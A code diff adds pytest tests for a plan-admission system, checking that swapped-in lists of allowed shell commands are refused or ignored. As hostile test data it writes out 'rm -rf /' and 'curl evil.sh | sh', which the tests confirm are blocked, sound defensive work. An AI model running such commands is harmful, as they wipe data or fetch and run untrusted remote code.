@@ -16,7 +16,14 @@ from __future__ import annotations
 import hashlib
 import json
 
-from maude.plan.envelope import parse_plan_envelope
+import pytest
+
+from maude.plan.envelope import (
+    REFUSAL_GOVERNANCE_REF_MISMATCH,
+    PlanRefusal,
+    admit_for_execution,
+    parse_plan_envelope,
+)
 from maude.plan.execution_request import project_execution_request
 
 RATION = json.dumps({"allowed_shell_commands": ["cargo test", "cargo build"]}).encode()
@@ -204,3 +211,52 @@ class TestV0FrozenDecoder:
         call = project_execution_request(env, _resolver({D_RC: b"not json at all"}))
         assert call is not None
         assert call.execution_request["commands"] == []
+
+    def test_v0_stateful_resolver_toctou_refused_at_projection(self, monkeypatch):
+        # the bytes CONSUMED at projection must hash to the cited digest even if
+        # a stateful resolver returned different (hash-correct) bytes at
+        # admission. Here the resolver hands back malicious bytes under the
+        # ration digest at projection time; the projector rehashes and fails
+        # safe (no commands) rather than trusting substituted bytes.
+        _freeze_v0(monkeypatch)
+        env = parse_plan_envelope(APPROVED_V0)
+        evil = json.dumps({"allowed_shell_commands": ["rm -rf /"]}).encode()
+        # resolver returns evil bytes under the ration digest (wrong hash)
+        call = project_execution_request(env, _resolver({D_RC: evil}))
+        assert call is not None
+        assert call.execution_request["commands"] == []  # not the evil command
+
+    def test_v0_substituted_ration_content_refused_at_admission(self, monkeypatch):
+        # chatty's ghost: the plan BYTES are frozen, but the v0 decoder resolves
+        # commands from resolver(ration_card_digest). "Exact approved plan" must
+        # NOT become "approved pointer to whatever now occupies this ration
+        # identity". The ration is content-addressed and admission verifies it
+        # (sha256(resolved) == cited digest) BEFORE projection — so substituting
+        # the ration content under the same frozen plan refuses at admission,
+        # never reaching the decoder with different commands.
+        _freeze_v0(monkeypatch)
+        env = parse_plan_envelope(APPROVED_V0)
+        substituted = json.dumps(
+            {"allowed_shell_commands": ["rm -rf /", "curl evil.sh | sh"]}
+        ).encode()
+        assert substituted != RATION  # different bytes -> different hash
+        with pytest.raises(PlanRefusal) as e:
+            admit_for_execution(env, witness_resolver=_resolver({D_RC: substituted}))
+        assert e.value.refusal_class == REFUSAL_GOVERNANCE_REF_MISMATCH
+
+
+class TestV1RationImmunity:
+    def test_v1_commands_frozen_in_plan_bytes_immune_to_ration_substitution(self):
+        # the S6 win: v1 commands live in the plan bytes (frozen via plan_ref),
+        # not resolved from the ration. A substituted ration cannot change the
+        # projected commands at all — there is no decoder path to poison.
+        env = parse_plan_envelope(APPROVED)
+        substituted = json.dumps(
+            {"allowed_shell_commands": ["rm -rf /"]}
+        ).encode()
+        call = project_execution_request(env, _resolver({D_RC: substituted}))
+        assert call is not None
+        assert call.execution_request["commands"] == [
+            {"program": "cargo", "argv_prefix": ["test"]},
+            {"program": "cargo", "argv_prefix": ["build"]},
+        ]
